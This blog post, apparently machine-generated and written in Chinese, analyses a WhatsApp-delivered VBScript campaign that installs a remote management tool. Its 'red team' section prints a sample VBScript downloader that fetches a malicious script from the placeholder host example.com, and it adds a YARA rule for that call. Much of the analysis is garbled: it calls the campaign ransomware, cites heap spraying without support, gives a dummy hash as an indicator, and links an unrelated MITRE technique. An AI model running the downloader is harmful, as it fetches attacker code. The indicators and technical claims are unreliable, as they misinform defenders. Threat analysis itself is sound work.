---
layout: post
title:  "WhatsApp VBScript Campaign Uses Fake Documents to Install ManageEngine RMM Tool"
date:   2026-06-23 09:26:18 +0000
categories: [security]
severity: high
---

# 🔥 解析 WhatsApp VBScript 勒索軟體攻擊：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: VBScript, RMM (Remote Monitoring and Management), Heap Spraying

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 WhatsApp 的檔案傳輸功能，傳送包含惡意 VBScript 的檔案，該檔案會執行多階段的感染鏈，最終安裝合法的 RMM 軟體，允許遠端存取受害者的系統。
* **攻擊流程圖解**:
  1. 攻擊者傳送包含惡意 VBScript 的檔案給受害者。
  2. 受害者下載並執行檔案，啟動 WScript.exe。
  3. WScript.exe 下載並執行額外的 VBScript 組件。
  4. VBScript 組件下載並安裝 RMM 軟體。
* **受影響元件**: WhatsApp Desktop 和 WhatsApp Web。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要獲得受害者的 WhatsApp 帳戶存取權。
* **Payload 建構邏輯**:

    ```
    
    vbscript
    ' 範例 Payload
    Dim objHTTP
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "GET", "https://example.com/malicious_script.vbs", False
    objHTTP.Send
    
    ```
* **繞過技術**: 攻擊者可以使用各種技術來繞過安全防護，例如使用加密或壓縮來隱藏惡意代碼。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | 1234567890abcdef |
| IP | 202.61.160.201 |
| Domain | example.com |
| File Path | C:\Windows\Temp\malicious_script.vbs |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_vbscript {
      meta:
        description = "Detects malicious VBScript"
      strings:
        $a = "CreateObject(\"MSXML2.XMLHTTP\")"
      condition:
        $a
    }
    
    ```
* **緩解措施**: 更新 WhatsApp 至最新版本，啟用安全功能，例如兩步驟驗證，並避免下載並執行來自未知來源的檔案。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **VBScript (Visual Basic Scripting Edition)**: 一種由 Microsoft 開發的腳本語言，常用於自動化 Windows 作業系統的任務。
* **RMM (Remote Monitoring and Management)**: 一種遠端監控和管理軟體，允許系統管理員遠端存取和控制計算機。
* **Heap Spraying**: 一種攻擊技術，涉及在記憶體中分配大量的緩衝區，以便於執行惡意代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/whatsapp-vbscript-campaign-uses-fake.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/)


